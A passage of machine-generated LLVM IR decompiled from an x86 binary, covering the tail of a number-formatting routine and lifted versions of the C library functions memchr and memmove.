  %v0_8056380 = phi i32 [ %v0_8056362, %dec_label_pc_805635e ], [ %v0_8056362, %dec_label_pc_8056357 ], [ %v1_8056376, %dec_label_pc_8056362 ]
  %v0_8056379 = phi i32 [ %v0_8056379111, %dec_label_pc_805635e ], [ %v0_8056379111, %dec_label_pc_8056357 ], [ %v0_8056379.pre, %dec_label_pc_8056362 ]
  %v1_8056379 = add i32 %v0_8056379, 1
  %v8_8056379 = icmp eq i32 %v1_8056379, 0
  store i32 %v1_8056379, i32* %ebx.global-to-local, align 4
  br i1 %v8_8056379, label %dec_label_pc_8056393, label %dec_label_pc_805637c

dec_label_pc_805637c:                             ; preds = %dec_label_pc_8056379
  %v1_805637e = sub i32 -1, %v0_8056379
  store i32 %v1_805637e, i32* %eax.global-to-local, align 4
  %v1_8056380 = inttoptr i32 %v0_8056380 to i32*
  store i32 176, i32* %v1_8056380, align 4
  %v0_8056386 = load i32, i32* %eax.global-to-local, align 4
  %v1_8056386 = load i32, i32* @ecx, align 4
  %v2_8056386 = add i32 %v1_8056386, 4
  %v3_8056386 = inttoptr i32 %v2_8056386 to i32*
  store i32 %v0_8056386, i32* %v3_8056386, align 4
  %v0_8056389 = load i32, i32* @ecx, align 4
  %v1_8056389 = add i32 %v0_8056389, 8
  %v2_8056389 = inttoptr i32 %v1_8056389 to i32*
  store i32 ptrtoint (i32* @global_var_805ed93.1013 to i32), i32* %v2_8056389, align 4
  %v0_8056390 = load i32, i32* @ecx, align 4
  %v1_8056390 = add i32 %v0_8056390, 12
  store i32 %v1_8056390, i32* @ecx, align 4
  br label %dec_label_pc_8056393

dec_label_pc_8056393:                             ; preds = %dec_label_pc_8056379, %dec_label_pc_805637c
  %v0_8056397 = phi i32 [ %v0_8056380, %dec_label_pc_8056379 ], [ %v1_8056390, %dec_label_pc_805637c ]
  %v0_8056393 = load i32, i32* %edx.global-to-local, align 4
  %v1_8056393 = icmp eq i32 %v0_8056393, 0
  br i1 %v1_8056393, label %dec_label_pc_80563a6, label %dec_label_pc_8056397

dec_label_pc_8056397:                             ; preds = %dec_label_pc_8056393
  %v1_8056397 = inttoptr i32 %v0_8056397 to i32*
  store i32 112, i32* %v1_8056397, align 4
  %v0_805639d = load i32, i32* %edx.global-to-local, align 4
  %v1_805639d = load i32, i32* @ecx, align 4
  %v2_805639d = add i32 %v1_805639d, 4
  %v3_805639d = inttoptr i32 %v2_805639d to i32*
  store i32 %v0_805639d, i32* %v3_805639d, align 4
  %v0_80563a0 = load i32, i32* %edi.global-to-local, align 4
  %v1_80563a0 = load i32, i32* @ecx, align 4
  %v2_80563a0 = add i32 %v1_80563a0, 8
  %v3_80563a0 = inttoptr i32 %v2_80563a0 to i32*
  store i32 %v0_80563a0, i32* %v3_80563a0, align 4
  %v0_80563a3 = load i32, i32* @ecx, align 4
  %v1_80563a3 = add i32 %v0_80563a3, 12
  store i32 %v1_80563a3, i32* @ecx, align 4
  br label %dec_label_pc_80563a6

dec_label_pc_80563a6:                             ; preds = %dec_label_pc_8056393, %dec_label_pc_8056397
  %v0_80563c4 = phi i32 [ %v0_8056397, %dec_label_pc_8056393 ], [ %v1_80563a3, %dec_label_pc_8056397 ]
  br i1 %v1_80561c0, label %dec_label_pc_80563ba, label %dec_label_pc_80563ad

dec_label_pc_80563ad:                             ; preds = %dec_label_pc_80563a6
  store i32 %tmp156, i32* %eax.global-to-local, align 4
  %v3_80563b4 = load i8, i8* %v2_805634d, align 1
  %v4_80563b4 = and i8 %v3_80563b4, 16
  %v5_80563b4 = icmp eq i8 %v4_80563b4, 0
  br i1 %v5_80563b4, label %dec_label_pc_80563d7, label %dec_label_pc_80563ba

dec_label_pc_80563ba:                             ; preds = %dec_label_pc_80563ad, %dec_label_pc_80563a6
  %v0_80563ba = load i32, i32* %edx.global-to-local, align 4
  %v1_80563bc = load i32, i32* %ebx.global-to-local, align 4
  %v2_80563bc = sub i32 %v0_80563ba, %v1_80563bc
  store i32 %v2_80563bc, i32* %eax.global-to-local, align 4
  %v1_80563be = load i32, i32* %ebp.global-to-local, align 4
  %v2_80563be = sub i32 %v2_80563bc, %v1_80563be
  %v8_80563be = xor i32 %v1_80563be, %v2_80563bc
  %v9_80563be = xor i32 %v2_80563be, %v2_80563bc
  %v10_80563be = and i32 %v9_80563be, %v8_80563be
  %v11_80563be = icmp slt i32 %v10_80563be, 0
  %v13_80563be = icmp slt i32 %v2_80563be, 0
  %v2_80563c0 = icmp eq i1 %v13_80563be, %v11_80563be
  br i1 %v2_80563c0, label %dec_label_pc_80563d7, label %dec_label_pc_80563c2

dec_label_pc_80563c2:                             ; preds = %dec_label_pc_80563ba
  %v2_80563c2 = sub i32 %v1_80563be, %v2_80563bc
  store i32 %v2_80563c2, i32* %ebp.global-to-local, align 4
  %v1_80563c4 = inttoptr i32 %v0_80563c4 to i32*
  store i32 176, i32* %v1_80563c4, align 4
  %v0_80563ca = load i32, i32* %ebp.global-to-local, align 4
  %v1_80563ca = load i32, i32* @ecx, align 4
  %v2_80563ca = add i32 %v1_80563ca, 4
  %v3_80563ca = inttoptr i32 %v2_80563ca to i32*
  store i32 %v0_80563ca, i32* %v3_80563ca, align 4
  %v0_80563cd = load i32, i32* @ecx, align 4
  %v1_80563cd = add i32 %v0_80563cd, 8
  %v2_80563cd = inttoptr i32 %v1_80563cd to i32*
  store i32 ptrtoint (i32* @global_var_805ed93.1013 to i32), i32* %v2_80563cd, align 4
  %v0_80563d4 = load i32, i32* @ecx, align 4
  %v1_80563d4 = add i32 %v0_80563d4, 12
  store i32 %v1_80563d4, i32* @ecx, align 4
  br label %dec_label_pc_80563d7

dec_label_pc_80563d7:                             ; preds = %dec_label_pc_80563ba, %dec_label_pc_80563ad, %dec_label_pc_80563c2
  %v1_805645f121 = phi i32 [ %v0_80563c4, %dec_label_pc_80563ba ], [ %v0_80563c4, %dec_label_pc_80563ad ], [ %v1_80563d4, %dec_label_pc_80563c2 ]
  %v12_80563d7 = icmp eq i8 %stack_var_-197.2, 102
  br i1 %v12_80563d7, label %dec_label_pc_8056452, label %dec_label_pc_80563de

dec_label_pc_80563de:                             ; preds = %dec_label_pc_80563d7
  %v5_80563de = load i32, i32* %edx.global-to-local, align 4
  %v6_80563de = and i32 %v5_80563de, -256
  %v7_80563de = or i32 %v6_80563de, %stack_var_-42.0
  store i32 %v7_80563de, i32* %edx.global-to-local, align 4
  %v0_80563e5 = load i32, i32* %esi.global-to-local, align 4
  %v2_80563e5 = icmp slt i32 %v0_80563e5, 0
  %v1_80563e7 = trunc i32 %stack_var_-42.0 to i8
  br i1 %v2_80563e5, label %dec_label_pc_80563f6, label %dec_label_pc_80563ff

dec_label_pc_80563f6:                             ; preds = %dec_label_pc_80563de
  store i32 %v0_80563e5, i32* %edx.global-to-local, align 4
  %v1_80563f8 = sub i32 0, %v0_80563e5
  br label %dec_label_pc_80563ff

dec_label_pc_80563ff:                             ; preds = %dec_label_pc_80563de, %dec_label_pc_80563f6
  %storemerge27 = phi i32 [ %v1_80563f8, %dec_label_pc_80563f6 ], [ %v0_80563e5, %dec_label_pc_80563de ]
  %storemerge9 = phi i8 [ 45, %dec_label_pc_80563f6 ], [ 43, %dec_label_pc_80563de ]
  store i32 %storemerge27, i32* %edx.global-to-local, align 4
  store i32 0, i32* %stack_var_-27, align 4
  %v2_8056407 = ptrtoint i32* %stack_var_-27 to i32
  store i32 %v2_8056407, i32* %ebx.global-to-local, align 4
  store i32 2, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8056413

dec_label_pc_8056413:                             ; preds = %dec_label_pc_8056413.backedge, %dec_label_pc_80563ff
  %v0_805641e = phi i32 [ %v0_805641e.pre, %dec_label_pc_8056413.backedge ], [ %v2_8056407, %dec_label_pc_80563ff ]
  %v0_805641b = phi i32 [ %v0_805641b.pre, %dec_label_pc_8056413.backedge ], [ 2, %dec_label_pc_80563ff ]
  %v0_8056413 = phi i32 [ %v9_805641c, %dec_label_pc_8056413.backedge ], [ %storemerge27, %dec_label_pc_80563ff ]
  %v1_805641a = ashr i32 %v0_8056413, 31
  %v1_805641b = add i32 %v0_805641b, 1
  store i32 %v1_805641b, i32* %edi.global-to-local, align 4
  %v2_805641c = zext i32 %v0_8056413 to i64
  %v4_805641c = zext i32 %v1_805641a to i64
  %v5_805641c = mul nuw i64 %v4_805641c, 4294967296
  %v6_805641c = or i64 %v5_805641c, %v2_805641c
  %v8_805641c = sdiv i64 %v6_805641c, 10
  %v9_805641c = trunc i64 %v8_805641c to i32
  %v10_805641c = srem i64 %v6_805641c, 10
  %v1_805641e = add i32 %v0_805641e, -1
  store i32 %v1_805641e, i32* %ebx.global-to-local, align 4
  store i32 %v9_805641c, i32* %esi.global-to-local, align 4
  %v3_8056421 = and i32 %v9_805641c, -256
  %v1_8056423 = trunc i64 %v10_805641c to i8
  %v2_8056423 = add i8 %v1_8056423, 48
  %v12_8056423 = zext i8 %v2_8056423 to i32
  %v15_8056423 = or i32 %v12_8056423, %v3_8056421
  store i32 %v15_8056423, i32* %eax.global-to-local, align 4
  %v3_8056428 = inttoptr i32 %v1_805641e to i8*
  store i8 %v2_8056423, i8* %v3_8056428, align 1
  store i32 %v9_805641c, i32* %edx.global-to-local, align 4
  %v7_805642c = icmp sgt i32 %v1_805641b, 3
  br i1 %v7_805642c, label %dec_label_pc_805642e, label %dec_label_pc_8056413.backedge

dec_label_pc_805642e:                             ; preds = %dec_label_pc_8056413
  %v2_805642e = icmp eq i32 %v9_805641c, 0
  %v1_8056430 = icmp eq i1 %v2_805642e, false
  br i1 %v1_8056430, label %dec_label_pc_8056413.backedge, label %dec_label_pc_8056432

dec_label_pc_8056413.backedge:                    ; preds = %dec_label_pc_805642e, %dec_label_pc_8056413
  %v0_805641b.pre = load i32, i32* %edi.global-to-local, align 4
  %v0_805641e.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8056413

dec_label_pc_8056432:                             ; preds = %dec_label_pc_805642e
  %v4_8056432 = zext i8 %storemerge9 to i32
  %v7_8056432 = or i32 %v3_8056421, %v4_8056432
  store i32 %v7_8056432, i32* %edx.global-to-local, align 4
  %v0_8056436 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8056436 = add i32 %v0_8056436, -2
  store i32 %v1_8056436, i32* %eax.global-to-local, align 4
  %v3_8056439 = add i32 %v0_8056436, -1
  %v4_8056439 = inttoptr i32 %v3_8056439 to i8*
  store i8 %storemerge9, i8* %v4_8056439, align 1
  %v5_805643c = load i32, i32* %edx.global-to-local, align 4
  %v6_805643c = and i32 %v5_805643c, -256
  %v7_805643c = or i32 %v6_805643c, %stack_var_-42.0
  store i32 %v7_805643c, i32* %edx.global-to-local, align 4
  %v2_8056440 = load i32, i32* %ebx.global-to-local, align 4
  %v3_8056440 = add i32 %v2_8056440, -2
  %v4_8056440 = inttoptr i32 %v3_8056440 to i8*
  store i8 %v1_80563e7, i8* %v4_8056440, align 1
  %v0_8056443 = load i32, i32* @ecx, align 4
  %v1_8056443 = inttoptr i32 %v0_8056443 to i32*
  store i32 112, i32* %v1_8056443, align 4
  %v0_8056449 = load i32, i32* %edi.global-to-local, align 4
  %v1_8056449 = load i32, i32* @ecx, align 4
  %v2_8056449 = add i32 %v1_8056449, 4
  %v3_8056449 = inttoptr i32 %v2_8056449 to i32*
  store i32 %v0_8056449, i32* %v3_8056449, align 4
  %v0_805644c = load i32, i32* %eax.global-to-local, align 4
  %v1_805644c = load i32, i32* @ecx, align 4
  %v2_805644c = add i32 %v1_805644c, 8
  %v3_805644c = inttoptr i32 %v2_805644c to i32*
  store i32 %v0_805644c, i32* %v3_805644c, align 4
  %v0_805644f = load i32, i32* @ecx, align 4
  %v1_805644f = add i32 %v0_805644f, 12
  store i32 %v1_805644f, i32* @ecx, align 4
  br label %dec_label_pc_8056452

dec_label_pc_8056452:                             ; preds = %dec_label_pc_80563d7, %dec_label_pc_8056081, %dec_label_pc_8056432
  %v0_80564d1 = phi i32 [ %v1_805645f121, %dec_label_pc_80563d7 ], [ %v2_8056089, %dec_label_pc_8056081 ], [ %v1_805644f, %dec_label_pc_8056432 ]
  %v2_8056452 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_8056452, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8056456

dec_label_pc_8056456:                             ; preds = %dec_label_pc_8056456, %dec_label_pc_8056452
  %v0_8056456 = phi i32 [ %v2_8056452, %dec_label_pc_8056452 ], [ %v1_8056458, %dec_label_pc_8056456 ]
  %stack_var_-216.0 = phi i32 [ %v3_8055f83, %dec_label_pc_8056452 ], [ %v5_805645b, %dec_label_pc_8056456 ]
  %v1_8056456 = inttoptr i32 %v0_8056456 to i32*
  %v2_8056456 = load i32, i32* %v1_8056456, align 4
  store i32 %v2_8056456, i32* %ebx.global-to-local, align 4
  %v1_8056458 = add i32 %v0_8056456, 12
  store i32 %v1_8056458, i32* %eax.global-to-local, align 4
  %v5_805645b = sub i32 %stack_var_-216.0, %v2_8056456
  %v7_805645f = icmp ult i32 %v1_8056458, %v0_80564d1
  br i1 %v7_805645f, label %dec_label_pc_8056456, label %dec_label_pc_8056463

dec_label_pc_8056463:                             ; preds = %dec_label_pc_8056456
  store i32 %v0_80564d1, i32* %esi.global-to-local, align 4
  %v5_8056476 = icmp eq i8 %stack_var_-26.0, 0
  store i32 160, i32* %stack_var_-168, align 4
  %v1_8056486 = icmp eq i1 %v5_8056476, false
  %v2_8056486 = zext i1 %v1_8056486 to i32
  store i32 %v2_8056486, i32* %edx.global-to-local, align 4
  %v2_8056489 = sub i32 %v5_805645b, %v2_8056486
  store i32 %v2_8056489, i32* %eax.global-to-local, align 4
  %tmp190 = icmp slt i32 %v2_8056489, 1
  br i1 %tmp190, label %dec_label_pc_80564d3, label %dec_label_pc_8056493

dec_label_pc_8056493:                             ; preds = %dec_label_pc_8056463
  store i32 %tmp156, i32* %edx.global-to-local, align 4
  %v2_805649a = inttoptr i32 %v1_8055fc3 to i8*
  %v3_805649a = load i8, i8* %v2_805649a, align 1
  %v4_805649a = and i8 %v3_805649a, 8
  %v5_805649a = icmp eq i8 %v4_805649a, 0
  br i1 %v5_805649a, label %dec_label_pc_80564b5, label %dec_label_pc_80564a0

dec_label_pc_80564a0:                             ; preds = %dec_label_pc_8056493
  %v1_80564a0 = add i32 %v0_80564d1, 12
  store i32 %v1_80564a0, i32* %esi.global-to-local, align 4
  %v1_80564a3 = inttoptr i32 %v0_80564d1 to i32*
  store i32 160, i32* %v1_80564a3, align 4
  %v1_80564a9 = load i32, i32* @ecx, align 4
  %v2_80564a9 = add i32 %v1_80564a9, 4
  %v3_80564a9 = inttoptr i32 %v2_80564a9 to i32*
  store i32 %v2_8056489, i32* %v3_80564a9, align 4
  %v0_80564ac = load i32, i32* @ecx, align 4
  %v1_80564ac = add i32 %v0_80564ac, 8
  %v2_80564ac = inttoptr i32 %v1_80564ac to i32*
  store i32 ptrtoint (i32* @global_var_805ed93.1013 to i32), i32* %v2_80564ac, align 4
  br label %dec_label_pc_80564d3

dec_label_pc_80564b5:                             ; preds = %dec_label_pc_8056493
  store i32 %tmp156, i32* %ebx.global-to-local, align 4
  %v1_80564bc = add i32 %tmp156, 16
  %v2_80564bc = inttoptr i32 %v1_80564bc to i32*
  %v3_80564bc = load i32, i32* %v2_80564bc, align 4
  %v9_80564bc = icmp eq i32 %v3_80564bc, 48
  %v1_80564c0 = icmp eq i1 %v9_80564bc, false
  br i1 %v1_80564c0, label %dec_label_pc_80564cd, label %dec_label_pc_80564c2

dec_label_pc_80564c2:                             ; preds = %dec_label_pc_80564b5
  %v3_80564c2 = load i32, i32* %stack_var_-152, align 4
  %v5_80564c2 = add i32 %v3_80564c2, %v2_8056489
  store i32 %v5_80564c2, i32* %stack_var_-152, align 4
  br label %dec_label_pc_80564d1

dec_label_pc_80564c8:                             ; preds = %dec_label_pc_80564d9
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8056500

dec_label_pc_80564cd:                             ; preds = %dec_label_pc_80564b5
  br label %dec_label_pc_80564d1

dec_label_pc_80564d1:                             ; preds = %dec_label_pc_80564c2, %dec_label_pc_80564cd
  store i32 %v0_80564d1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80564d3

dec_label_pc_80564d3:                             ; preds = %dec_label_pc_8056463, %dec_label_pc_80564a0, %dec_label_pc_80564d1
  store i32 0, i32* %edi.global-to-local, align 4
  %v2_80564d5 = ptrtoint i32* %stack_var_-168 to i32
  store i32 %v2_80564d5, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80564d9

dec_label_pc_80564d9:                             ; preds = %dec_label_pc_80564f7, %dec_label_pc_80564d3
  call void @__pseudo_call(i32 %tmp156)
  %v1_80564f2 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80564f2 = add i32 %v1_80564f2, 4
  %v3_80564f2 = inttoptr i32 %v2_80564f2 to i32*
  %v4_80564f2 = load i32, i32* %v3_80564f2, align 4
  %v15_80564f2 = icmp eq i32 %v2_8056489, %v4_80564f2
  %v1_80564f5 = icmp eq i1 %v15_80564f2, false
  br i1 %v1_80564f5, label %dec_label_pc_80564c8, label %dec_label_pc_80564f7

dec_label_pc_80564f7:                             ; preds = %dec_label_pc_80564d9
  %v1_80564f7 = add i32 %v1_80564f2, 12
  store i32 %v1_80564f7, i32* %ebx.global-to-local, align 4
  %v0_80564fa = load i32, i32* %edi.global-to-local, align 4
  %v2_80564fa = add i32 %v0_80564fa, %v2_8056489
  store i32 %v2_80564fa, i32* %edi.global-to-local, align 4
  %v1_80564fc = load i32, i32* %esi.global-to-local, align 4
  %v7_80564fc = icmp ult i32 %v1_80564f7, %v1_80564fc
  br i1 %v7_80564fc, label %dec_label_pc_80564d9, label %dec_label_pc_8056500

dec_label_pc_8056500:                             ; preds = %dec_label_pc_80564f7, %dec_label_pc_80564c8
  %v0_8056506 = phi i32 [ -1, %dec_label_pc_80564c8 ], [ %v2_80564fa, %dec_label_pc_80564f7 ]
  store i32 %v0_8056506, i32* %eax.global-to-local, align 4
  %v2_8056509 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8056509, i32* @esi, align 4
  store i32 %v0_8055f66, i32* @edi, align 4
  store i32 %v0_8055f65, i32* @ebp, align 4
  ret i32 %v0_8056506

; uselistorder directives
  uselistorder i32 %v0_8056506, { 1, 0 }
  uselistorder i32 %v2_8056489, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 %v2_8056486, { 1, 0 }
  uselistorder i32 %v1_8056458, { 1, 2, 0 }
  uselistorder i32 %v0_8056456, { 1, 0 }
  uselistorder i32 %v0_80564d1, { 1, 3, 2, 4, 0 }
  uselistorder i32 %v9_805641c, { 3, 2, 1, 0, 4 }
  uselistorder i8 %storemerge9, { 1, 0 }
  uselistorder i32 %v0_80563e5, { 2, 1, 0, 3 }
  uselistorder i32 %v2_80563be, { 1, 0 }
  uselistorder i32 %v1_80563be, { 1, 0, 2 }
  uselistorder i32 %v2_80563bc, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_8056379, { 1, 0 }
  uselistorder i32 %v2_80562e6, { 2, 1, 3, 0 }
  uselistorder i32 %v2_80562e0, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_805633d, { 4, 0, 3, 1, 2, 5, 6, 7 }
  uselistorder i32 %v1_805627c, { 1, 0 }
  uselistorder i32 %v0_8056277, { 1, 2, 0, 3 }
  uselistorder i32 %v2_8056244, { 1, 2, 3, 0, 4 }
  uselistorder i8 %v2_805623f, { 1, 0 }
  uselistorder i8 %v2_8056238, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v0_8056238, { 1, 0, 3, 2 }
  uselistorder i32 %stack_var_-220.3, { 1, 0 }
  uselistorder i32 %v0_80561c2, { 1, 2, 0 }
  uselistorder i32 %stack_var_-42.0, { 0, 2, 1 }
  uselistorder i8 %stack_var_-207.1, { 4, 3, 1, 5, 0, 2 }
  uselistorder i8 %v4_80561a7, { 1, 0 }
  uselistorder i32 %tmp195, { 3, 1, 2, 0 }
  uselistorder x86_fp80 %v3_8056172, { 1, 0 }
  uselistorder i32 %v2_805612b, { 2, 1, 0 }
  uselistorder i32 %v0_80561e1, { 1, 2, 0, 3 }
  uselistorder x86_fp80 %v1_80560fd, { 1, 0 }
  uselistorder x86_fp80 %v3_80560df, { 2, 0, 1, 3, 6, 7, 5, 8, 4, 9, 10 }
  uselistorder i32 %v3_80560dc, { 1, 0 }
  uselistorder x86_fp80 %v4_80560c4, { 2, 0, 1, 3, 4 }
  uselistorder x86_fp80 %v3_80560be, { 1, 2, 0 }
  uselistorder i32 %v3_80560bb, { 1, 0 }
  uselistorder i32 %v1_80560b4, { 3, 0, 1, 2 }
  uselistorder i32 %stack_var_-220.0, { 2, 0, 1 }
  uselistorder x86_fp80 %v1_80560ed, { 8, 1, 2, 5, 3, 4, 6, 0, 7, 9 }
  uselistorder x86_fp80 %v2_80560b5, { 1, 0 }
  uselistorder i8 %v4_8056065, { 1, 0 }
  uselistorder i3 %v1_8056002, { 1, 0, 2 }
  uselistorder i8 %stack_var_-207.0, { 3, 2, 0, 4, 5, 1, 6, 7 }
  uselistorder i8 %v3_8055f8a, { 1, 0, 2, 3 }
  uselistorder i32 %v3_8055f83, { 1, 0, 2 }
  uselistorder i3 %v4_8055f7c, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-144, { 1, 0, 2 }
  uselistorder i32* %stack_var_-72, { 1, 0, 2 }
  uselistorder i32* %stack_var_-71, { 1, 0 }
  uselistorder i32* %stack_var_-132, { 2, 0, 1 }
  uselistorder i32* %stack_var_-27, { 1, 0 }
  uselistorder i32* %stack_var_-152, { 0, 1, 4, 2, 3 }
  uselistorder i32* %stack_var_-168, { 1, 0 }
  uselistorder i32 %tmp156, { 14, 13, 12, 11, 10, 9, 8, 7, 0, 6, 1, 2, 3, 5, 4 }
  uselistorder x86_fp80 %tmp155, { 3, 2, 1, 0, 4, 5 }
  uselistorder x86_fp80* %st1.global-to-local, { 8, 7, 9, 11, 10, 6, 0, 1, 12, 4, 5, 2, 3 }
  uselistorder x86_fp80* %st0.global-to-local, { 2, 5, 6, 0, 3, 4, 8, 1, 7 }
  uselistorder i3* %fpu_stat_TOP.global-to-local, { 0, 4, 5, 6, 7, 8, 1, 9, 10, 2, 3 }
  uselistorder i32* %esi.global-to-local, { 10, 8, 9, 11, 12, 3, 1, 2, 0, 4, 5, 6, 7 }
  uselistorder i32* %edx.global-to-local, { 21, 22, 23, 24, 25, 26, 1, 27, 28, 4, 6, 5, 7, 2, 3, 8, 11, 9, 12, 10, 13, 14, 15, 16, 17, 0, 18, 19, 20 }
  uselistorder i32* %edi.global-to-local, { 3, 5, 6, 4, 8, 7, 9, 10, 1, 0, 2 }
  uselistorder i32* %ebx.global-to-local, { 18, 19, 20, 21, 22, 24, 25, 23, 26, 27, 28, 29, 14, 0, 1, 15, 2, 3, 4, 5, 9, 10, 6, 7, 8, 11, 12, 13, 16, 17 }
  uselistorder i32* %ebp.global-to-local, { 9, 10, 5, 6, 0, 3, 2, 1, 4, 7, 8 }
  uselistorder i32* %eax.global-to-local, { 20, 21, 24, 25, 26, 27, 28, 29, 30, 31, 32, 0, 1, 2, 3, 4, 5, 22, 23, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder i64 10, { 1, 0, 2 }
  uselistorder i8 45, { 2, 3, 1, 0, 4 }
  uselistorder i32 165, { 1, 0 }
  uselistorder i32 21, { 1, 2, 0 }
  uselistorder i8 102, { 2, 3, 1, 0 }
  uselistorder i8 103, { 1, 2, 0 }
  uselistorder i32 69, { 1, 2, 0 }
  uselistorder x86_fp80 0xK401CEE6B280000000000, { 1, 2, 0 }
  uselistorder i32 13, { 1, 6, 5, 2, 3, 4, 0 }
  uselistorder x86_fp80 0xK3FFD8000000000000000, { 1, 0, 2, 3 }
  uselistorder x86_fp80 0xK00000000000000000000, { 0, 2, 3, 4, 1 }
  uselistorder i8 6, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80564d3, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80564d1, { 1, 0 }
  uselistorder label %dec_label_pc_8056452, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80563ff, { 1, 0 }
  uselistorder label %dec_label_pc_80563d7, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80563a6, { 1, 0 }
  uselistorder label %dec_label_pc_8056393, { 1, 0 }
  uselistorder label %dec_label_pc_8056379, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8056346, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8056331, { 1, 0 }
  uselistorder label %dec_label_pc_8056326, { 1, 0 }
  uselistorder label %dec_label_pc_80562ad, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805629f, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8056265, { 1, 0 }
  uselistorder label %dec_label_pc_8056235.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_8056201, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80561d0, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80561bb, { 1, 0 }
  uselistorder label %dec_label_pc_8056127, { 1, 0 }
  uselistorder label %dec_label_pc_80560ff, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80560fd, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80560ed, { 1, 0 }
  uselistorder label %dec_label_pc_8056081, { 1, 0 }
  uselistorder label %dec_label_pc_8055faa, { 1, 0 }
}

define i32 @__GI_memchr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-4 = alloca i32, align 4
  %v0_8056510 = load i32, i32* @edi, align 4
  store i32 %v0_8056510, i32* %stack_var_-4, align 4
  store i32 %arg3, i32* @ecx, align 4
  %v4_8056517 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8056517, i32* %edi.global-to-local, align 4
  %v1_805651f = icmp eq i32 %arg3, 0
  store i1 %v1_805651f, i1* %zf.global-to-local, align 1
  br i1 %v1_805651f, label %dec_label_pc_805652f, label %dec_label_pc_8056523

dec_label_pc_8056523:                             ; preds = %entry
  %v2_8056523 = call i32 @_strlen(i8* %arg1)
  %v3_8056523 = mul i32 %v2_8056523, -1
  %v4_8056523 = add i32 %v3_8056523, -2
  store i32 %v4_8056523, i32* @ecx, align 4
  %v0_8056525 = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_8056525, label %dec_label_pc_8056523.dec_label_pc_805652c_crit_edge, label %dec_label_pc_8056527

dec_label_pc_8056523.dec_label_pc_805652c_crit_edge: ; preds = %dec_label_pc_8056523
  %v0_805652c.pre = load i32, i32* %edi.global-to-local, align 4
  %phitmp = add i32 %v0_805652c.pre, -1
  br label %dec_label_pc_805652c

dec_label_pc_8056527:                             ; preds = %dec_label_pc_8056523
  store i32 1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805652c

dec_label_pc_805652c:                             ; preds = %dec_label_pc_8056523.dec_label_pc_805652c_crit_edge, %dec_label_pc_8056527
  %v0_805652c = phi i32 [ %phitmp, %dec_label_pc_8056523.dec_label_pc_805652c_crit_edge ], [ 0, %dec_label_pc_8056527 ]
  %v8_805652c = icmp eq i32 %v0_805652c, 0
  store i1 %v8_805652c, i1* %zf.global-to-local, align 1
  store i32 %v0_805652c, i32* %edi.global-to-local, align 4
  %v2_805652f.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805652f

dec_label_pc_805652f:                             ; preds = %entry, %dec_label_pc_805652c
  %v0_8056530 = phi i32 [ 0, %entry ], [ %v0_805652c, %dec_label_pc_805652c ]
  %v2_805652f = phi i32 [ %v0_8056510, %entry ], [ %v2_805652f.pre, %dec_label_pc_805652c ]
  store i32 %v2_805652f, i32* @edi, align 4
  ret i32 %v0_8056530

; uselistorder directives
  uselistorder i32 %v0_805652c, { 2, 0, 1 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_805652f, { 1, 0 }
  uselistorder label %dec_label_pc_805652c, { 1, 0 }
}

define i32 @memmove(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_8056535 = load i32, i32* @esi, align 4
  store i32 %v0_8056535, i32* %stack_var_-8, align 4
  %v4_8056536 = ptrtoint i8* %arg1 to i32
  %v9_8056542 = icmp ugt i8* %tmp3, %arg1
  %v1_8056544 = icmp eq i1 %v9_8056542, false
  br i1 %v1_8056544, label %dec_label_pc_805654c, label %dec_label_pc_8056546

dec_label_pc_8056546:                             ; preds = %entry
  %v7_8056548 = call i8* @_memcpy(i8* %arg1, i8* %tmp3, i32 %tmp)
  br label %dec_label_pc_8056558

dec_label_pc_805654c:                             ; preds = %entry
  %v3_805654c = add i32 %arg2, -1
  %v4_805654c = add i32 %v3_805654c, %tmp
  %v5_805654c = inttoptr i32 %v4_805654c to i8*
  %v3_8056550 = add i32 %v4_8056536, -1
  %v4_8056550 = add i32 %v3_8056550, %tmp
  %v5_8056550 = inttoptr i32 %v4_8056550 to i8*
  %v7_8056555 = call i8* @_memcpy(i8* %v5_8056550, i8* %v5_805654c, i32 %tmp)
  store i1 false, i1* @df, align 1
  br label %dec_label_pc_8056558

dec_label_pc_8056558:                             ; preds = %dec_label_pc_8056546, %dec_label_pc_805654c
  %v2_8056558 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8056558, i32* @esi, align 4
  ret i32 %v4_8056536

; uselistorder directives
  uselistorder i8* %tmp3, { 1, 0 }
